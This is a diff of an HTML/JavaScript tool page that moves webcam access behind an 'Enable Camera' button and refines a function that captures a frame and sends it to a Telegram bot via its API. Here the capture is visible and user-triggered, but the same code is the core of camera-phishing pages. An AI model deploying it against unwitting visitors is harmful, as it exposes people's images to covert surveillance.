@@ -111,7 +111,8 @@
 
   <div class="card">
     <h3>6. Webcam Access & Send to Telegram</h3>
-    <video id="video" autoplay></video>
+    <video id="video" autoplay playsinline></video>
+    <button onclick="startCamera()">Enable Camera</button>
     <button onclick="captureAndSend()">Capture & Send</button>
     <p id="camStatus"></p>
   </div>
@@ -172,7 +173,7 @@
     document.getElementById("headerOutput").innerText = JSON.stringify(result, null, 2);
   }
 
-  // Hash
+  // Hash Generator
   function generateHash() {
     const text = document.getElementById("hashInput").value;
     const type = document.getElementById("hashType").value;
@@ -183,25 +184,39 @@
     document.getElementById("hashResult").innerText = `${type.toUpperCase()}: ${hash}`;
   }
 
-  // Camera Access
+  // Camera Stream
+  let stream;
   const video = document.getElementById("video");
-  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-    video.srcObject = stream;
-    video.style.display = "block";
-  }).catch(err => {
-    document.getElementById("camStatus").innerText = "Permission denied!";
-  });
+
+  function startCamera() {
+    navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+      stream = s;
+      video.srcObject = stream;
+      video.style.display = "block";
+      document.getElementById("camStatus").innerText = "Camera enabled!";
+    }).catch(() => {
+      document.getElementById("camStatus").innerText = "Permission denied!";
+    });
+  }
 
   function captureAndSend() {
+    if (!video || video.readyState < video.HAVE_ENOUGH_DATA) {
+      document.getElementById("camStatus").innerText = "Camera not ready!";
+      return;
+    }
+
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
+
     const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
     canvas.toBlob(blob => {
       const formData = new FormData();
       formData.append("chat_id", TELEGRAM_CHAT_ID);
       formData.append("photo", blob, "photo.jpg");
+
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
         method: "POST",
         body: formData
@@ -213,7 +228,7 @@
     }, 'image/jpeg');
   }
 
-  // Matrix Background
+  // Matrix Background Effect
   const canvas = document.getElementById("matrix");
   const ctx = canvas.getContext("2d");
   canvas.height = window.innerHeight;
